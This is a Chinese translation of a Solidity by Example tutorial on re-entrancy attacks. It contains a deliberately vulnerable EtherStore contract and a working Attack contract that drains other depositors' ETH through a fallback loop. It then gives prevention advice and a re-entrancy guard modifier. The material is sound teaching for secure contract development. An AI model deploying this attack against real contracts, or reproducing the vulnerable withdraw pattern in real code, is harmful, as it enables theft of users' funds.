# 重入攻击

对应英文原页：https://solidity-by-example.org/hacks/re-entrancy

## 漏洞

假设合约 `A` 调用合约 `B`。

重入（re-entrancy）漏洞允许 `B` 在 `A` 执行完成之前回调 `A`。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
EtherStore 是一个可以存入和提取 ETH 的合约。
该合约容易受到重入攻击。
让我们看看原因。

1. 部署 EtherStore
2. 从账户 1（Alice）和账户 2（Bob）各向 EtherStore 存入 1 Ether
3. 使用 EtherStore 的地址部署 Attack
4. 调用 Attack.attack 并发送 1 ether（使用账户 3（Eve））。
   你将拿回 3 Ether（从 Alice 和 Bob 那里偷来的 2 Ether，
   再加上从本合约发送的 1 Ether）。

发生了什么？
Attack 能够在 EtherStore.withdraw 执行结束之前
多次调用 EtherStore.withdraw。

函数的调用过程如下
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback（收到 1 Ether）
- EtherStore.withdraw
- Attack.fallback（收到 1 Ether）
- EtherStore.withdraw
- Attack fallback（收到 1 Ether）
*/

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // 用于检查本合约余额的辅助函数
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 当 EtherStore 向本合约发送 Ether 时，会调用 fallback。
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // 用于检查本合约余额的辅助函数
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

## 预防措施

- 确保所有状态变更都发生在调用外部合约之前
- 使用防止重入的函数修饰符

下面是一个重入锁（re-entrancy guard）的示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
```

---
## 关注我们
[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)


[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
